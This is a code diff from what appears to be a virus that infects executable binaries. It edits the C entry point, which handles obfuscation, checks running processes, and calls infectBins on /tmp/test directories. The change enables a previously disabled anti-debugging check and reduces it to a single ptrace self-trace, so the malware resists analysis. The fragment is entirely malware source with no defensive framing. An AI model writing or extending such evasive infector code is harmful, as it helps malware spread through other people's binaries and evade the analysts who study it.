@@ -41,13 +41,13 @@ int   entry_point(void *magic) {
   char    infectDir2[] = "/tmp/test2";
   char    procName[] = "/proc/";
 
+  if (checkProcess(procName) != 0)
+    return (stop(1, magic));
+  if (preventDebug() == -1)
+    return (1);
   if (magic != (void *)0x42)
     if (unObfuscate() == -1)
       return (stop(1, magic));
-  if (checkProcess(procName) != 0)
-    return (stop(1, magic));
-  /* if (preventDebug() != 0) */
-  /*   return (1); */
   if (infectBins(infectDir) == -1)
     return (stop(1, magic));
   /* if (infectBins(infectDir2) == -1) */
@@ -442,21 +442,8 @@ static int  checkProcess(char *dirname) {
 }
 
 static int   preventDebug(void) {
-  pid_t pid;
-
-  if ((pid = fork()) == -1)
+  if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
     return (-1);
-  if (pid != 0) {
-    if (ptrace(PTRACE_ATTACH, pid, 0, 0) == -1 ||
-        waitpid(pid, 0, 0) == -1) {
-      kill(pid, SIGTERM);
-      return (-1);
-    }
-    exit(0);
-  } else {
-    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
-      exit(1);
-  }
   return (0);
 }
 
